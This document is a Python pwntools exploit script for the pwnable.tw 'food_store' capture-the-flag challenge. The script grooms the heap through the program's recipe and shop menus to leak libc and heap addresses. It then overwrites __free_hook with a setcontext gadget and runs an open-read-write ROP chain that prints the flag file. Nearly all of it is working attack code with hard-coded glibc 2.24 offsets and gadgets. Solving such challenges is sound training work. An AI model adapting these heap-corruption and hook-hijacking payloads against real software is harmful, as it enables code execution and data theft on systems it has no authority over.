#!python3

from pathlib import Path
import re

from pwn import *


SCRIPT_DIR = Path(__file__).resolve().parent


def pick_existing(*names):
    for name in names:
        path = SCRIPT_DIR / name
        if path.exists():
            return path
    raise FileNotFoundError(f"missing required file, tried: {names}")


exe = ELF(str(pick_existing("food_store_patched")), checksec=False)
libc = ELF(
    str(
        pick_existing(
            "libc.so.6",
            "libc-4e5dfd832191073e18a09728f68666b6465eeacd.so",
        )
    ),
    checksec=False,
)
ld = ELF(str(pick_existing("ld-2.24.so")), checksec=False)

context.binary = exe
context.timeout = 3

# Using tmux
context.terminal = ['tmux', 'splitw', '-h', '-F', '#{pane_pid}', '-P']

remote_connection = "nc chall.pwnable.tw 10406".split()
local_port = 1337

gdbscript = '''

'''

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)


def start():
    if args.REMOTE:
        return remote(remote_connection[1], int(remote_connection[2]))
    elif args.LOCAL:
        return remote("localhost", local_port)
    elif args.GDB:
        return gdb.debug([exe.path], cwd=str(SCRIPT_DIR), gdbscript=gdbscript)
    else:
        return process([exe.path], cwd=str(SCRIPT_DIR))


def GDB():
    if not args.LOCAL and not args.REMOTE:
        gdb.attach(p, gdbscript=gdbscript)
        pause()


###############################################
# Struct layouts (for reference)
# ingredient (name=>str, price=>uint, amount=>uint) 0x28
# ingredient_list (ingredient=>ptr) 0x58
# recipe (title=>str, ingredient=>ptr, next_recipe=>ptr) 0x88
# dish (name=>str, value=>int, energy=>lu, next_dish=>ptr, prev_dish=>ptr) 0x38
###############################################

### Offsets (libc 2.24)
main_arena_offset = 0x3C1B00
large_bin_offset = main_arena_offset + 0x718
malloc_hook_offset = 0x3C1AF0
free_hook_offset = 0x3C3788

### ROP gadget offsets
L_nop = 0x10F80
L_pop_rdi = 0x1FD7A
L_pop_rsi = 0x1FCBD
L_pop_rdx = 0x1B92
L_pop_rax = 0x3A998
L_syscall = 0xF888E
L_pop15 = 0xF8766
setcontext_gadget = 0x48045

### Heap deltas verified locally
HEAP_LEAK_DELTA = 0xB50
ARG_DELTA = 0xBD0
FRAME_DELTA = 0xD20


###############################################
# Helper wrappers
###############################################

CHEF_RE = re.compile(rb"Power\s*:\s*(\d+)\s*\nMoney\s*:\s*(\d+)")


def mc(n):
    sla(b"Your choice:", str(n).encode())


def recipe_enter():
    mc(1)


def recipe_create(name, ingredients):
    mc(1)
    sla(b"Title :", name if isinstance(name, bytes) else name.encode())
    sla(b"Choose ingredient :", str(ingredients[0]).encode())
    for i in ingredients[1:]:
        sla(b"Add more ingredient ? (1/Yes,2/No) :", b"1")
        sla(b"Choose ingredient :", str(i).encode())
    sla(b"Add more ingredient ? (1/Yes,2/No) :", b"2")


def recipe_delete(name):
    mc(2)
    sla(b"Title :", name if isinstance(name, bytes) else name.encode())


def recipe_leave():
    mc(4)


def assignment(name):
    wanted = name if isinstance(name, bytes) else name.encode()
    mc(2)
    out = p.recvuntil(b"Your choice (1/Yes,0/No) :", timeout=3)
    if wanted not in out:
        sl(b"0")
        p.recvuntil(b"So sad :(", timeout=3)
        return 0
    sl(b"1")
    p.recvuntil(b"Thank you !", timeout=3)
    return 1


def show_chef():
    mc(3)
    out = p.recvuntil(b"xxxxxxxxxxxxxxxxxxxxxxxxxxx", timeout=3)
    m = CHEF_RE.search(out)
    if not m:
        raise RuntimeError(f"chef parse failed: {out!r}")
    power, money = map(int, m.groups())
    return power, money


def shop_enter():
    mc(4)


def shop_buy(idx, cnt):
    sl(b"1")
    sna(b"What do you want to buy ? :", idx)
    sna(b"Quantity :", cnt)


def shop_sell(idx):
    sl(b"2")
    sna(b"What do you want to sell ? :", idx)


def shop_make(name):
    sl(b"3")
    sla(b"Enjoy it :)\n", name if isinstance(name, bytes) else name.encode())


def shop_leave():
    sl(b"4")


def parse_titles_from_cook_banner(blob):
    titles = []
    marker = b"Title : "
    idx = 0
    while True:
        pos = blob.find(marker, idx)
        if pos == -1:
            break
        end = blob.find(b"\n", pos)
        if end == -1:
            break
        titles.append(blob[pos + len(marker):end])
        idx = end + 1
    return titles


def cook(name, show=False):
    mc(5)
    leak = None
    banner = p.recvuntil(b"What do you want to cook :", timeout=3)
    if show:
        leak = parse_titles_from_cook_banner(banner)
    sl(name if isinstance(name, bytes) else name.encode())
    return leak


def eat(idx):
    mc(6)
    sna(b"What do you want to eat ? :", idx)


###############################################
# Exploit
###############################################

p = start()

sla(b"Your name: ", b"M30W")

# Stage 1: bootstrap
cook(b"Beef noodles")
eat(0)
cook(b"Beef noodles")
shop_enter()
shop_sell(0)
shop_buy(2, 1)
shop_buy(5, 1)
shop_leave()

recipe_enter()
recipe_create(b"Expensive", [2, 3, 3, 3, 4])
recipe_create(b"Cheap", [0])
recipe_leave()

cook(b"Expensive")
eat(0)
cook(b"Cheap")
while assignment(b"Cheap") == 0:
    pass
cook(b"Cheap")

# Stage 2: largebin/libc leak
recipe_enter()
recipe_create(b"pad1_1", [0])
recipe_create(b"pad1_2", [0])
for i in range(0x40):
    info(f"Creating pad1_2_{i} ({i + 1}/0x40)")
    recipe_create(f"pad1_2_{i}".encode(), [0])
recipe_leave()

shop_enter()
shop_buy(4, 0)
shop_leave()

recipe_enter()
recipe_create(b"pad1_3", [0])
recipe_create(b"pad1_4", [0])
for i in range(0x41):
    recipe_create(f"pad1_4_{i}".encode(), [0])
recipe_leave()

shop_enter()
shop_buy(6, 0)
shop_leave()

recipe_enter()
for i in range(0x3F, -1, -1):
    recipe_delete(f"pad1_2_{i}".encode())
for i in range(0x40, -1, -1):
    recipe_delete(f"pad1_4_{i}".encode())
recipe_delete(b"pad1_4")
recipe_delete(b"pad1_2")
recipe_delete(b"pad1_1")
recipe_delete(b"pad1_3")
recipe_create(b"pad1", [0])
recipe_leave()

leak_name = cook(b"nothing", show=True)[-1]
large_bin_addr = u64(leak_name.ljust(8, b"\x00"))
libc_base = large_bin_addr - large_bin_offset
log.success(f"leak_name = {leak_name!r}")
log.success(f"large_bin_addr = {large_bin_addr:#x}")
log.success(f"libc_base = {libc_base:#x}")

# Stage 3: heap leak
cook(leak_name)
eat(1)
cook(leak_name)
shop_enter()
shop_sell(1)
shop_leave()
cook(leak_name)

recipe_enter()
recipe_create(b"pad2_1", [0])
recipe_create(b"pad2_2", [0])
recipe_create(b"pad2_3", [0])
recipe_create(b"pad2_4", [0])
recipe_create(b"pad2_5", [0])
recipe_create(b"pad2_6", [0])
recipe_leave()

cook(leak_name)

recipe_enter()
recipe_delete(b"pad2_6")
recipe_delete(b"pad2_4")
recipe_delete(b"pad2_3")
recipe_delete(b"pad2_2")
recipe_delete(b"pad2_1")
recipe_delete(b"pad2_5")
recipe_create(b"pad2", [0])
recipe_leave()

for _ in range(7):
    cook(leak_name)

leak_name2 = cook(b"nothing", show=True)[-1]
heap_addr = u64(leak_name2.ljust(8, b"\x00")) - HEAP_LEAK_DELTA
log.success(f"leak_name2 = {leak_name2!r}")
log.success(f"heap_addr = {heap_addr:#x}")
cook(leak_name)

# Stage 4: build ORW payloads
argument = b"/home/food_store/flag"
ROPchain = (
    p64(libc_base + L_pop_rdi) + p64(heap_addr + ARG_DELTA) +
    p64(libc_base + L_pop_rsi) + p64(0) +
    p64(libc_base + L_pop_rdx) + p64(0) +
    p64(libc_base + L_pop_rax) + p64(2) +
    p64(libc_base + L_syscall) + p64(libc_base + L_nop) +
    p64(libc_base + L_pop_rdi) + p64(3) +
    p64(libc_base + L_pop_rsi) + p64(heap_addr) +
    p64(libc_base + L_pop_rdx) + p64(0x100) +
    p64(libc_base + L_pop_rax) + p64(0) +
    p64(libc_base + L_syscall) + p64(libc_base + L_nop) +
    p64(libc_base + L_pop_rdi) + p64(1) +
    p64(libc_base + L_pop_rsi) + p64(heap_addr) +
    p64(libc_base + L_pop_rdx) + p64(0x100) +
    p64(libc_base + L_pop_rax) + p64(1) +
    p64(libc_base + L_syscall) + p64(libc_base + L_nop)
)

recipe_enter()
recipe_create(argument, [0])
for i in range(0, len(ROPchain), 0x10):
    recipe_create(ROPchain[i:i + 0x10] + p64(libc_base + L_pop15)[:-1], [0])
recipe_leave()

# Stage 5: free_hook -> setcontext+0x35
recipe_enter()
recipe_create(b"pad3_1", [0])
recipe_create(b"pad3_2", [0])
recipe_create(b"pad3_3", [0])
recipe_create(b"pad3_4", [0])
recipe_create(b"pad3_5\x00\x00" + p64(0) + p64(libc_base + free_hook_offset - 0x80)[:-1], [0])
recipe_create(b"pad3_6\x00\x00" + p64(0) + p64(libc_base + setcontext_gadget)[:-1], [0])
recipe_leave()

cook(leak_name)
cook(leak_name)

recipe_enter()
recipe_delete(b"pad3_6")
recipe_delete(b"pad3_5")
recipe_delete(b"pad3_3")
recipe_delete(b"pad3_2")
recipe_delete(b"pad3_1")
recipe_delete(b"pad3_4")
recipe_create(b"pad3_4", [0])
recipe_leave()

for _ in range(5):
    cook(leak_name)

# Stage 6: final link and trigger
recipe_enter()
recipe_create(b"link_to_hook", [0])
recipe_create(b"link_to_gadget", [0])
recipe_leave()

shop_enter()
shop_make(
    p64(0) +
    p64(0) +
    p64(heap_addr + FRAME_DELTA) +
    p64(libc_base + L_nop)[:-1]
)
shop_leave()

recipe_enter()
recipe_delete(b"link_to_gadget")

p.interactive()